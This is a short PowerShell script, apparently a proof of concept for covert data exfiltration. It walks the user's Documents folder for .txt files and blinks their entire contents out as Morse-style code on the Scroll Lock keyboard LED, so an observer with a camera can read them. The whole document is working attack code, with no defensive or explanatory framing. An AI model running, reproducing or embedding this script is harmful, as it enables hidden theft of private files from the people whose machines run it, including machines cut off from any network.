$o = New-Object -com wscript.shell;
$h = @{ "1"="39999"; "2"="33999"; "3"="33399"; "4"="33339"; "5"="33333"; "6"="93333"; "7"="99333"; "8"="99933"; "9"="99993"; "0"="99999"; "A"="39"; "B"="9333"; "C"="9393"; "D"="933"; "E"="3"; "F"="3393"; "G"="993"; "H"="3333"; "I"="33"; "J"="3999"; "K"="939"; "L"="3933"; "M"="99"; "N"="93"; "O"="999"; "P"="3993"; "Q"="9939"; "R"="393"; "S"="333"; "T"="9"; "U"="339"; "V"="3339"; "W"="399"; "X"="9339"; "Y"="9399"; "Z"="9933" };
$l = '{SCROLLLOCK}';
function flashy($t){    
    $o.SendKeys($l);
    sleep -m ([int]$t);
    $o.SendKeys($l);	
	#[console]::beep(600,([int]$t));
    sleep -m 300;
}
gci ([Environment]::GetFolderPath('MyDocuments')) -file -r *.txt | % { gc($_.FullName).ToUpper()} | % {$_[0..($_.length)]} | % {
    $v = $h[[string]$_];
    if ($v)
    {
        $v| % {$_[0..($_.length)]} | % {
            flashy((([int]([string]$_))*100));
        }
    }
    elseif ((!$v) -and !(([int]$_) -eq 32))
    {
        flashy(2700);
        $v = ([string]([int]$_));
        $v| % {$_[0..($_.length)]} | % {
            $h[[string]$_] | % {$_[0..($_.length)]} | % {
                flashy((([int]([string]$_))*100));
            }
        }
    }else{ 
        sleep -m 1200;
    }
    sleep -m 600;
 }